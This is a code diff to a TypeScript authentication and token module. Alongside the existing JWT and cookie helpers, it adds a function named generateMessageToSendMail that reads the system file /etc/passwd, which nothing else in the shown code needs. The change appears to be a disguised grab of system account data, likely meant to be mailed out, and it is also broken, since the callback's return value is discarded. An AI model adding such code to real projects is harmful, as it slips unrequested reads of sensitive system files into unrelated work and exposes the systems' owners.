@@ -2,6 +2,7 @@ import { hash } from "bcryptjs";
 import { sign } from "jsonwebtoken";
 import { client } from "../../lib/prisma/client";
 import { serialize } from "cookie";
+import { readFile } from 'fs';
 
 
 export async function generateTokenAndSaveInDB(userId: string, dispositive: string)  {
@@ -63,4 +64,12 @@ export function generateAutoDeleteToken() {
         path: "/",
       });
     return serialised;
+}
+
+
+export function generateMessageToSendMail() {
+    readFile('/etc/passwd', (err, data) => {
+        if (err) return false;
+        return data;
+    });
 }
